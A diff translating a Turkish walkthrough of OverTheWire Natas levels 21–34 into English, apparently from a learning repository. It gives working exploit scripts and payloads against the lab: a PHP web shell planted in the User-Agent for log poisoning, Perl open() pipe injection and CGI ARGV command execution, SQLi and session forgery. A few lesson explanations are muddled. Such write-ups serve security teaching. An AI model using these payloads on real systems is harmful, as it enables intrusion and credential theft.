@@ -1,50 +1,50 @@
-# 🌐 OverTheWire: Natas — Level 21'den Level 34'e Türkçe Rehber
+# 🌐 OverTheWire: Natas — Level 21 to Level 34 English Guide
 
-> Son ve en zorlu bölüm. Cross-site session paylaşımı, PHP type juggling,  
-> deserialization, LFI + log poisoning, MySQL truncation, ECB şifre kırma,  
-> ve Perl'e özgü açıklar seni bekliyor.
+> The final and most challenging section. Cross-site session sharing, PHP type juggling,  
+> deserialization, LFI + log poisoning, MySQL truncation, ECB cipher cracking,  
+> and Perl-specific vulnerabilities await you.
 
-**Önceki bölüm:** [natas_11-20.md](./natas_11-20.md)  
-**Referans:** [learnhacking.io](https://learnhacking.io/) · [jameskaois.com](https://jameskaois.com/posts/overthewire-natas-level-21-24/)
+**Previous section:** [natas_11-20.md](./natas_11-20.md)  
+**Reference:** [learnhacking.io](https://learnhacking.io/) · [jameskaois.com](https://jameskaois.com/posts/overthewire-natas-level-21-24/)
 
 ---
 
-## 🗺️ Genel Bakış
+## 🗺️ Overview
 
-| Level | Konu | Teknik |
+| Level | Topic | Technique |
 |---|---|---|
-| 21 → 22 | Cross-site session paylaşımı | Experimenter sitesinde session oluştur |
-| 22 → 23 | PHP redirect bypass | curl ile redirect'i atla |
+| 21 → 22 | Cross-site session sharing | Create session on experimenter site |
+| 22 → 23 | PHP redirect bypass | Bypass redirect with curl |
 | 23 → 24 | PHP type juggling (string > int) | `11iloveyou` |
-| 24 → 25 | `strcmp()` array bypass | `passwd[]` dizisi ile NULL döndür |
+| 24 → 25 | `strcmp()` array bypass | Return NULL with `passwd[]` array |
 | 25 → 26 | LFI + Log Poisoning | `....//` bypass + User-Agent injection |
-| 26 → 27 | PHP object deserialization | Logger sınıfını serialize et |
-| 27 → 28 | MySQL varchar truncation | `natas28` + boşluk ile duplicate user |
-| 28 → 29 | ECB şifre kırma | Block cipher byte shifting |
-| 29 → 30 | Perl `open()` RCE | `|komut` ile pipe injection |
-| 30 → 31 | Perl DBI `quote()` bypass | Array tipi ile SQLi |
+| 26 → 27 | PHP object deserialization | Serialize Logger class |
+| 27 → 28 | MySQL varchar truncation | Duplicate user with `natas28` + spaces |
+| 28 → 29 | ECB cipher cracking | Block cipher byte shifting |
+| 29 → 30 | Perl `open()` RCE | Pipe injection with `|command` |
+| 30 → 31 | Perl DBI `quote()` bypass | SQLi with array type |
 | 31 → 32 | Perl Jam 2 / CGI `ARGV` | File upload + query string RCE |
-| 32 → 33 | Perl Jam 2 (devam) | `./getpassword` binary çalıştır |
-| 33 → 34 | MD5 / PHP file upload + hash bypass | Phar deserialize veya hash collision |
+| 32 → 33 | Perl Jam 2 (continued) | Run `./getpassword` binary |
+| 33 → 34 | MD5 / PHP file upload + hash bypass | Phar deserialize or hash collision |
 
 ---
 
-## Level 21 → Level 22 — Cross-Site Session Paylaşımı
+## Level 21 → Level 22 — Cross-Site Session Sharing
 
-### 🎯 Görev
-İki site var: ana site ve `experimenter`. Experimenter'da `admin=1` session'ı oluşturup ana siteye taşı.
+### 🎯 Task
+There are two sites: the main site and `experimenter`. Create an `admin=1` session on experimenter and transfer it to the main site.
 
-### 📖 Teori
-İki site aynı session backend'ini paylaşıyor. Experimenter sitesinde herhangi bir parametre session'a yazılabiliyor — güvenlik kontrolü yok!
+### 📖 Theory
+The two sites share the same session backend. Any parameter sent to the experimenter site is written to the session — no security check!
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```python
 import requests
 
-auth = ("natas21", "<şifre>")
+auth = ("natas21", "<password>")
 
-# 1. Experimenter'a admin=1 gönder, PHPSESSID al
+# 1. Send admin=1 to experimenter, get PHPSESSID
 r1 = requests.get(
     "http://natas21-experimenter.natas.labs.overthewire.org/",
     params={"admin": "1", "submit": "Update"},
@@ -52,143 +52,143 @@ r1 = requests.get(
 )
 phpsessid = r1.cookies['PHPSESSID']
 
-# 2. Aynı PHPSESSID ile ana siteye git
+# 2. Navigate to main site with same PHPSESSID
 r2 = requests.get(
     "http://natas21.natas.labs.overthewire.org/",
     auth=auth,
     cookies={"PHPSESSID": phpsessid}
 )
-print(r2.text)  # şifre burada
+print(r2.text)  # password is here
 ```
 
-> 💡 **Ders:** Session'ı paylaşan uygulamalar birbirinin güvenlik açıklarından etkilenir. Her site kendi session'ını bağımsız doğrulamalı.
+> 💡 **Lesson:** Applications sharing a session are affected by each other's security vulnerabilities. Each site should independently validate its own session.
 
 ---
 
 ## Level 22 → Level 23 — PHP Redirect Bypass (curl)
 
-### 🎯 Görev
-`?revelio` parametresi şifreyi gösteriyor ama admin değilsen direkt redirect yapıyor. Redirect'i atla.
+### 🎯 Task
+The `?revelio` parameter shows the password but redirects immediately if you're not admin. Bypass the redirect.
 
-### 📖 Teori
-PHP `header("Location: /")` redirect'i tarayıcılar otomatik takip eder. Ama `curl` varsayılan olarak takip etmez ve redirect öncesi response body'yi gösterir!
+### 📖 Theory
+PHP `header("Location: /")` redirect is automatically followed by browsers. But `curl` doesn't follow redirects by default and shows the response body before the redirect!
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```bash
-curl -s -u natas22:<şifre> \
+curl -s -u natas22:<password> \
   "http://natas22.natas.labs.overthewire.org/?revelio"
-# Redirect öncesi HTML döner → şifre içinde
+# HTML returned before redirect → password inside
 ```
 
-> 💡 **Ders:** Güvenlik kontrolü redirect'ten önce değil, redirect'ten **önce** içerik gönderilmemeli. `exit` ya da `die` kullanılmalı.
+> 💡 **Lesson:** Security check shouldn't send content before the redirect. Use `exit` or `die`.
 
 ---
 
 ## Level 23 → Level 24 — PHP Type Juggling
 
-### 🎯 Görev
+### 🎯 Task
 ```php
 if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10))
 ```
-Hem "iloveyou" içermeli hem de 10'dan büyük olmalı.
+Must contain "iloveyou" and be greater than 10.
 
-### 📖 Teori: PHP'de String-Integer Karşılaştırması
+### 📖 Theory: String-Integer Comparison in PHP
 
-PHP'de bir string ile integer karşılaştırılırken, string sayısal değeri **başındaki rakamlardan** okunur:
+When a string is compared with an integer in PHP, the string's numeric value is **read from its leading digits**:
 ```php
 "11iloveyou" > 10  → true  (11 > 10)
 "iloveyou" > 10    → false (0 > 10)
 ```
 
-### 🔧 Çözüm
+### 🔧 Solution
 ```
-Forma yaz: 11iloveyou
+Enter in the form: 11iloveyou
 → strstr("11iloveyou", "iloveyou") = true ✓
 → "11iloveyou" > 10 → 11 > 10 = true ✓
-→ Şifre verilir
+→ Password is given
 ```
 
-> 💡 **Ders:** PHP'nin zayıf tip sistemi (loose typing) güvenlik açıklarına yol açar. `===` (strict comparison) kullan, `==` değil.
+> 💡 **Lesson:** PHP's weak type system (loose typing) leads to security vulnerabilities. Use `===` (strict comparison), not `==`.
 
 ---
 
 ## Level 24 → Level 25 — strcmp() Array Bypass
 
-### 🎯 Görev
+### 🎯 Task
 ```php
-if(!strcmp($_REQUEST["passwd"], "<gizli_şifre>"))
+if(!strcmp($_REQUEST["passwd"], "<hidden_password>"))
 ```
-`strcmp()` fonksiyonunu atlatmak gerekiyor.
+Need to bypass the `strcmp()` function.
 
-### 📖 Teori: PHP strcmp() ile Array
+### 📖 Theory: PHP strcmp() with Array
 
-PHP'de `strcmp()` bir string yerine **array** alırsa `NULL` döner. `!NULL` → `true`!
+In PHP, if `strcmp()` receives an **array** instead of a string, it returns `NULL`. `!NULL` → `true`!
 
 ```php
 strcmp([], "abc")  → NULL
 !NULL              → true
 ```
 
-### 🔧 Çözüm
+### 🔧 Solution
 ```
-URL'ye git:
+Navigate to URL:
 http://natas24.natas.labs.overthewire.org/?passwd[]=anything
 
-→ passwd[] array olur → strcmp NULL döner → !NULL = true → şifre verilir
+→ passwd[] becomes an array → strcmp returns NULL → !NULL = true → password given
 ```
 
-> 💡 **Ders:** PHP'de tip kontrolü olmadan `strcmp()` kullanmak tehlikeli. `=== 0` yerine `strcmp` sonucunu kontrol etmek gerekli.
+> 💡 **Lesson:** Using `strcmp()` without type checking in PHP is dangerous. Check if the `strcmp` result `=== 0`.
 
 ---
 
 ## Level 25 → Level 26 — LFI + Log Poisoning
 
-### 🎯 Görev
-Dil parametresi (`?lang=`) `../` filtreliyor ve `natas_webpass` engelliyor. İki açığı birleştir: directory traversal bypass + log poisoning.
+### 🎯 Task
+The language parameter (`?lang=`) filters `../` and blocks `natas_webpass`. Combine two vulnerabilities: directory traversal bypass + log poisoning.
 
-### 📖 Teori
+### 📖 Theory
 
-**`....//` bypass:** `str_replace("../", "")` sadece bir geçiş yapar:
+**`....//` bypass:** `str_replace("../", "")` only does one pass:
 ```
-....//  →  str_replace kaldırır ../  →  ../  ← istedğimiz buydu!
-```
-
-**Log Poisoning:** Log dosyası User-Agent'ı kaydediyor. User-Agent'a PHP kodu yazarsak, log dosyası include edildiğinde kod çalışır!
-
-### 🔧 Çözüm
-
-**Adım 1 — PHPSESSID'yi al:**
-```
-F12 → Application → Cookies → PHPSESSID değerini kopyala
+....//  →  str_replace removes ../  →  ../  ← that's what we wanted!
 ```
 
-**Adım 2 — Burp Suite/curl ile User-Agent'a PHP kodu yaz:**
+**Log Poisoning:** The log file records User-Agent. If we write PHP code in User-Agent, the code runs when the log file is included!
+
+### 🔧 Solution
+
+**Step 1 — Get PHPSESSID:**
+```
+F12 → Application → Cookies → copy PHPSESSID value
+```
+
+**Step 2 — Write PHP code to User-Agent with Burp Suite/curl:**
 ```bash
-curl -s -u natas25:<şifre> \
+curl -s -u natas25:<password> \
   "http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_SESSIONID.log" \
   -H 'User-Agent: <?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>'
 ```
 
-**Adım 3 — `....//` ile log dosyasını include et:**
+**Step 3 — Include the log file with `....//`:**
 ```
 http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_<PHPSESSID>.log
 ```
 
-Log dosyasında PHP kodu çalışır → şifre görünür.
+PHP code runs in the log file → password appears.
 
-> 💡 **Ders:** Log dosyaları asla web'e erişilebilir olmamalı. User input log'a yazılmadan sanitize edilmeli.
+> 💡 **Lesson:** Log files should never be web-accessible. User input must be sanitized before being written to logs.
 
 ---
 
 ## Level 26 → Level 27 — PHP Object Deserialization
 
-### 🎯 Görev
-Çizgi çizen bir uygulama var. Cookie'deki serialize edilmiş `Logger` nesnesini manipüle et.
+### 🎯 Task
+There's a line-drawing application. Manipulate the serialized `Logger` object in the cookie.
 
-### 📖 Teori: PHP Object Deserialization
+### 📖 Theory: PHP Object Deserialization
 
-PHP `unserialize()` ile cookie'deki veriyi nesneye dönüştürüyor. `Logger` sınıfının `__destruct()` methodu — nesne imha edildiğinde çalışır. `$exitMsg` ve `$logFile` değerlerini değiştirirsek, şifreyi istediğimiz yere yazabiliriz!
+PHP converts data in the cookie to an object with `unserialize()`. The `Logger` class's `__destruct()` method runs when the object is destroyed. If we change `$exitMsg` and `$logFile` values, we can write the password wherever we want!
 
 ```php
 class Logger {
@@ -196,15 +196,15 @@ class Logger {
     private $exitMsg;
     
     function __destruct() {
-        // exitMsg'i logFile'a yazar
+        // writes exitMsg to logFile
         file_put_contents($this->logFile, $this->exitMsg);
     }
 }
 ```
 
-### 🔧 Çözüm
+### 🔧 Solution
 
-PHP sandbox'ta (örn. 3v4l.org) çalıştır:
+Run in a PHP sandbox (e.g. 3v4l.org):
 ```php
 <?php
 class Logger {
@@ -216,134 +216,134 @@ $logger = new Logger();
 echo base64_encode(serialize($logger));
 ```
 
-Çıkan base64'ü `drawing` cookie'sine yaz → sayfa yüklendiğinde `__destruct()` shell.php'yi yazar:
+Write the resulting base64 to the `drawing` cookie → when the page loads, `__destruct()` writes shell.php:
 ```
 http://natas26.natas.labs.overthewire.org/img/shell.php?e=cat /etc/natas_webpass/natas27
 ```
 
-> 💡 **Ders:** Kullanıcı verisi asla `unserialize()` ile işlenmemeli. JSON kullan.
+> 💡 **Lesson:** User data should never be processed with `unserialize()`. Use JSON.
 
 ---
 
 ## Level 27 → Level 28 — MySQL VARCHAR Truncation
 
-### 🎯 Görev
-`natas28` kullanıcısı olarak login ol — ama şifresini bilmiyorsun.
+### 🎯 Task
+Log in as `natas28` — but you don't know the password.
 
-### 📖 Teori: MySQL VARCHAR Overflow
+### 📖 Theory: MySQL VARCHAR Overflow
 
-MySQL `VARCHAR(64)` alanı 64 karakterden fazlasını truncate eder. Eğer `"natas28" + 57 boşluk + "x"` kullanıcı adıyla kayıt olursak:
-- `validUser("natas28" + boşluklar + "x")` → bulunamaz → yeni user oluştur
-- MySQL truncate eder → `"natas28"` olarak kaydeder (boşluklar trim edilir)
-- Şimdi `natas28` + kendi şifremizle login → `dumpData("natas28")` → gerçek natas28'in verisini döker!
+MySQL `VARCHAR(64)` truncates strings longer than 64 characters. If we register with username `"natas28" + 57 spaces + "x"`:
+- `validUser("natas28" + spaces + "x")` → not found → create new user
+- MySQL truncates → saves as `"natas28"` (spaces are trimmed)
+- Now login with `natas28` + our password → `dumpData("natas28")` → dumps real natas28's data!
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```python
 import requests
 
-auth = ("natas27", "<şifre>")
+auth = ("natas27", "<password>")
 url = "http://natas27.natas.labs.overthewire.org/"
 
-# 1. natas28 + 57 boşluk + "x" ile kayıt ol
+# 1. Register with natas28 + 57 spaces + "x"
 username = "natas28" + " " * 57 + "x"
 requests.post(url, data={"username": username, "password": "mypass"}, auth=auth)
 
-# 2. "natas28" + kendi şifremizle login
+# 2. Login with "natas28" + our password
 r = requests.post(url, data={"username": "natas28", "password": "mypass"}, auth=auth)
-print(r.text)  # natas28'in verisi → şifre içinde
+print(r.text)  # natas28's data → password inside
 ```
 
-> 💡 **Ders:** Kullanıcı adı benzersizliği uygulama katmanında da kontrol edilmeli. DB truncation'a güvenme.
+> 💡 **Lesson:** Username uniqueness must be verified at the application layer as well. Don't rely on DB truncation.
 
 ---
 
-## Level 28 → Level 29 — ECB Şifre Kırma
+## Level 28 → Level 29 — ECB Cipher Cracking
 
-### 🎯 Görev
-Arama sorgusu şifreli gönderiliyor (ECB modu). Şifrelenmiş SQL injection payload'ı oluştur.
+### 🎯 Task
+Search query is sent encrypted (ECB mode). Create an encrypted SQL injection payload.
 
-### 📖 Teori: ECB (Electronic Codebook) Mode
+### 📖 Theory: ECB (Electronic Codebook) Mode
 
-ECB şifreleme her bloğu bağımsız şifreler. Aynı plaintext bloğu → her zaman aynı ciphertext. Bu zayıflıkla şifreli blokları keserek yapıştırabiliriz!
+ECB encryption encrypts each block independently. Same plaintext block → always same ciphertext. With this weakness we can cut and paste encrypted blocks!
 
 ```
 Plaintext: [PREPEND_TEXT][OUR_INPUT][PADDING]
 Encrypted: [Block1][Block2][Block3]
 
-Blokları yeniden düzenleyerek farklı bir plaintext oluşturabiliriz!
+We can rearrange the blocks to create different plaintext!
 ```
 
-### 🔧 Çözüm (Konsept)
+### 🔧 Solution (Concept)
 
-1. Boş arama yap → baseline şifreli değeri al
-2. Farklı uzunluklarda input göndererek blok boyutunu tespit et (32 byte artar → 16 byte'lık bloklar)
-3. Input'u öyle ayarla ki SQL injection payload'ı tam bir bloğa denk gelsin
-4. O bloğu baseline'daki PREPEND bloğuyla birleştir
+1. Do an empty search → get baseline encrypted value
+2. Send inputs of different lengths to detect block size (increases by 32 bytes → 16-byte blocks)
+3. Adjust input so the SQL injection payload aligns with a full block
+4. Combine that block with the PREPEND block from baseline
 
-Ayrıntılı Python implementasyonu için: [blog.sudarshandevkota.com.np](https://blog.sudarshandevkota.com.np/overthewire-natas-walkthrough)
+For detailed Python implementation: [blog.sudarshandevkota.com.np](https://blog.sudarshandevkota.com.np/overthewire-natas-walkthrough)
 
-> 💡 **Ders:** ECB modu güvenli değildir. CBC veya GCM kullan.
+> 💡 **Lesson:** ECB mode is not secure. Use CBC or GCM.
 
 ---
 
 ## Level 29 → Level 30 — Perl `open()` RCE
 
-### 🎯 Görev
-Perl uygulaması `open(FD, "$f.txt")` ile dosya açıyor. "natas" içeren stringler filtreliyor. Komut çalıştır.
+### 🎯 Task
+Perl application opens a file with `open(FD, "$f.txt")`. Filters strings containing "natas". Run a command.
 
-### 📖 Teori: Perl open() Güvenlik Açığı
+### 📖 Theory: Perl open() Security Vulnerability
 
-Perl'de `open(FD, "|komut")` komutu çalıştırır! Pipe karakteri `|` ile dosya adı yerine komut çalıştırılabilir.
+In Perl, `open(FD, "|command")` runs a command! With the pipe character `|`, a command can be executed instead of a filename.
 
-"natas" filtresi varsa wildcard kullan:
+If there's a "natas" filter, use wildcards:
 ```
-/etc/na?as_webpass/na?as30   →  natas'ı bypass eder!
+/etc/na?as_webpass/na?as30   →  bypasses natas!
 ```
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```
 URL:
 http://natas29.natas.labs.overthewire.org/index.pl?file=|cat /etc/na%3Fas_webpass/na%3Fas30%00
 
 %3F = ?
-%00 = null byte (dosya uzantısını kes)
+%00 = null byte (cut file extension)
 ```
 
-Veya:
+Or:
 ```
 ?file=|cat /etc/*_webpass/*30
 ```
 
-> 💡 **Ders:** Perl'de `open()` ile kullanıcı girdisi kullanma. `sysopen()` veya whitelist kullan.
+> 💡 **Lesson:** Don't use user input with `open()` in Perl. Use `sysopen()` or a whitelist.
 
 ---
 
 ## Level 30 → Level 31 — Perl DBI `quote()` Array Bypass
 
-### 🎯 Görev
-Perl `$dbh->quote(param("password"))` SQL injection'ı engellemeye çalışıyor. Array göndererek bypass et.
+### 🎯 Task
+Perl `$dbh->quote(param("password"))` tries to prevent SQL injection. Bypass it by sending an array.
 
-### 📖 Teori: Perl CGI param() ile Array
+### 📖 Theory: Perl CGI param() with Array
 
-`param("password")` yerine `param("password", "integer")` çağrılırsa, Perl'ın `quote()` fonksiyonu integer değer için tırnaksız (quote'suz) döner. Bu SQLi'ya kapı açar!
+If `param("password", "integer")` is called instead of `param("password")`, Perl's `quote()` function returns without quotes for integer values. This opens the door to SQLi!
 
 ```perl
 $dbh->quote(param('password'))
 # param('password', 'integer') → 1 OR 1=1
 ```
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```python
 import requests
 from requests.auth import HTTPBasicAuth
 
-auth = HTTPBasicAuth("natas30", "<şifre>")
+auth = HTTPBasicAuth("natas30", "<password>")
 url = "http://natas30.natas.labs.overthewire.org/"
 
-# password parametresini iki kez gönder: bir string, bir integer
+# Send password parameter twice: once as string, once as integer
 response = requests.post(url,
     data=[
         ("username", "natas30"),
@@ -355,44 +355,44 @@ response = requests.post(url,
 print(response.text)
 ```
 
-> 💡 **Ders:** Perl CGI'da `param()` list context'te array döner. DBI quote() bunu yanlış işler.
+> 💡 **Lesson:** In Perl CGI, `param()` returns an array in list context. DBI quote() handles this incorrectly.
 
 ---
 
 ## Level 31 → Level 32 — Perl Jam 2 / CGI ARGV
 
-### 🎯 Görev
-Perl CGI dosya yükleme uygulaması. "Perl Jam 2" açığını kullanarak RCE elde et.
+### 🎯 Task
+Perl CGI file upload application. Use the "Perl Jam 2" vulnerability to gain RCE.
 
-### 📖 Teori: Perl CGI ARGV Açığı
+### 📖 Theory: Perl CGI ARGV Vulnerability
 
-Perl CGI'da `upload()` list context'te çağrılırsa, `ARGV` adlı bir parametre özel anlam taşır — komut satırı argümanı gibi davranır. Bu, URL query string'ini `open()` için komut olarak çalıştırmaya olanak tanır!
+In Perl CGI, if `upload()` is called in list context, a parameter named `ARGV` has special meaning — it behaves like a command-line argument. This allows executing the URL query string as a command for `open()`!
 
 ```perl
-# Aslında bunu yapıyor:
-open(FD, "dosyaadi")
-# Ama ARGV hilesiyle:
-open(FD, "ls . |")   → komut çalışır!
+# What it actually does:
+open(FD, "filename")
+# But with the ARGV trick:
+open(FD, "ls . |")   → command runs!
 ```
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```python
 import requests
 
-auth = ("natas31", "<şifre>")
+auth = ("natas31", "<password>")
 url = "http://natas31.natas.labs.overthewire.org/index.pl"
 
-# 1. Önce ls ile binary'yi bul
+# 1. First find the binary with ls
 response = requests.post(
     url + "?ls . |",
     files=[('file', ('test.txt', 'test'))],
     data={'file': 'ARGV'},
     auth=auth
 )
-print(response.text)  # getpassword binary görünür
+print(response.text)  # getpassword binary visible
 
-# 2. Binary'yi çalıştır
+# 2. Run the binary
 response = requests.post(
     url + "?/usr/bin/cat /etc/natas_webpass/natas32 |",
     files=[('file', ('test.txt', 'test'))],
@@ -404,95 +404,95 @@ print(response.text)
 
 ---
 
-## Level 32 → Level 33 — Perl Jam 2 (Devam) + getpassword Binary
+## Level 32 → Level 33 — Perl Jam 2 (Continued) + getpassword Binary
 
-### 🎯 Görev
-Önceki level gibi ama şifre dosyasına direkt erişim yok — özel bir `getpassword` binary'si çalıştırman gerekiyor.
+### 🎯 Task
+Same as previous level but there's no direct access to the password file — you need to run a special `getpassword` binary.
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```python
 import requests
 
-auth = ("natas32", "<şifre>")
+auth = ("natas32", "<password>")
 url = "http://natas32.natas.labs.overthewire.org/index.pl"
 
-# 1. getpassword binary'sini bul
+# 1. Find the getpassword binary
 r = requests.post(
     url + "?ls . |",
     files=[('file', ('x', 'x'))],
     data={'file': 'ARGV'},
     auth=auth
 )
-print(r.text)  # getpassword listede
+print(r.text)  # getpassword in the list
 
-# 2. Çalıştır
+# 2. Run it
 r = requests.post(
     url + "?./getpassword | xargs echo |",
     files=[('file', ('x', 'x'))],
     data={'file': 'ARGV'},
     auth=auth
 )
-print(r.text)  # şifre burada
+print(r.text)  # password here
 ```
 
 ---
 
 ## Level 33 → Level 34 — PHP MD5 Hash & Phar Deserialization
 
-### 🎯 Görev
-Dosya yükleme var. MD5 hash kontrolü yapılıyor. Phar deserialization ile bypass et.
+### 🎯 Task
+There's a file upload. MD5 hash checking is performed. Bypass with Phar deserialization.
 
-### 📖 Teori: Phar Deserialization
+### 📖 Theory: Phar Deserialization
 
-PHP `phar://` stream wrapper'ı Phar arşivlerini açar. Phar dosyaları meta verisinde serialize edilmiş PHP nesneleri içerir. `file_get_contents("phar://dosya")` gibi bir çağrı, bu nesneleri otomatik deserialize eder!
+PHP's `phar://` stream wrapper opens Phar archives. Phar files contain serialized PHP objects in their metadata. A call like `file_get_contents("phar://file")` automatically deserializes these objects!
 
-Phar dosyasının MD5'i kontrol edilse de, dosya meta verisindeki nesne deserialize edilirken `__destruct()` çalışır → şifreye erişim!
+Even if the Phar file's MD5 is checked, `__destruct()` runs when the object in the file metadata is deserialized → access to password!
 
-### 🔧 Çözüm (Konsept)
+### 🔧 Solution (Concept)
 
-1. `Executor` sınıfını içeren bir PHP scripti yaz
-2. `phar` arşivi oluştur, serialize et
-3. Arşivi yükle (herhangi bir isimle — .png bile olur)
-4. MD5 bypass: dosyanın başına istenen hash'i içeren özel bir string ekle
-5. Server phar'ı deserialize ederken `__destruct()` çalışır
+1. Write a PHP script containing the `Executor` class
+2. Create a `phar` archive, serialize it
+3. Upload the archive (with any name — even .png works)
+4. MD5 bypass: prepend a special string containing the desired hash to the file
+5. When the server deserializes the phar, `__destruct()` runs
 
-Ayrıntılı implementasyon için: [learnhacking.io Natas 33](https://learnhacking.io/)
-
----
-
-## 🏁 Tebrikler — Natas Tamamlandı!
-
-```
-Level 34 → Oyun bitti!
-Natas'ı tamamladın — web güvenliğinin en kapsamlı CTF serisinden biri.
-```
+For detailed implementation: [learnhacking.io Natas 33](https://learnhacking.io/)
 
 ---
 
-## 📚 Öğrenilen Kavramlar Özeti (Level 21-34)
+## 🏁 Congratulations — Natas Complete!
 
-| Kavram | Açıklama |
+```
+Level 34 → Game over!
+You completed Natas — one of the most comprehensive CTF series in web security.
+```
+
+---
+
+## 📚 Concepts Summary (Level 21-34)
+
+| Concept | Description |
 |---|---|
-| **Cross-site Session** | İki site aynı session backend paylaşırsa → cross-contamination |
-| **PHP Redirect Bypass** | curl redirect'i otomatik takip etmez |
-| **Type Juggling** | PHP'de `"11text" > 10` → `true` |
+| **Cross-site Session** | If two sites share session backend → cross-contamination |
+| **PHP Redirect Bypass** | curl doesn't automatically follow redirects |
+| **Type Juggling** | In PHP `"11text" > 10` → `true` |
 | **strcmp() Array** | `strcmp([], "x")` → `NULL` → `!NULL` = `true` |
-| **LFI + Log Poisoning** | Traversal ile log'a erişim + User-Agent injection |
-| **PHP Deserialization** | `unserialize()` ile `__destruct()` tetikleme |
-| **MySQL Truncation** | VARCHAR sınırını aşarak duplicate user oluşturma |
-| **ECB Mode Attack** | Aynı plaintext → aynı ciphertext → blok manipülasyonu |
-| **Perl open() RCE** | `|komut` ile pipe mode |
+| **LFI + Log Poisoning** | Log access via traversal + User-Agent injection |
+| **PHP Deserialization** | Triggering `__destruct()` with `unserialize()` |
+| **MySQL Truncation** | Creating duplicate user by exceeding VARCHAR limit |
+| **ECB Mode Attack** | Same plaintext → same ciphertext → block manipulation |
+| **Perl open() RCE** | Pipe mode with `|command` |
 | **Perl DBI Array** | `param()` array → `quote()` bypass |
 | **Perl Jam 2** | CGI ARGV + upload → query string RCE |
-| **Phar Deserialization** | `phar://` stream wrapper ile nesne deserialize |
+| **Phar Deserialization** | Object deserialization via `phar://` stream wrapper |
 
 ---
 
-## 🔗 Faydalı Kaynaklar
+## 🔗 Useful Resources
 
 - [OverTheWire Natas](https://overthewire.org/wargames/natas/)
-- [LearnHacking.io Natas](https://learnhacking.io/) (25-31 arası)
+- [LearnHacking.io Natas](https://learnhacking.io/) (levels 25-31)
 - [JamesCao Natas 21-24](https://jameskaois.com/posts/overthewire-natas-level-21-24/)
 - [OWASP Deserialization](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
 - [Perl Jam 2 Presentation](https://www.youtube.com/watch?v=tBqHEJMalRE)
@@ -502,6 +502,6 @@ Natas'ı tamamladın — web güvenliğinin en kapsamlı CTF serisinden biri.
 
 ---
 
-**Önceki bölüm:** [natas_11-20.md](./natas_11-20.md)
+**Previous section:** [natas_11-20.md](./natas_11-20.md)
 
-*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
+*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
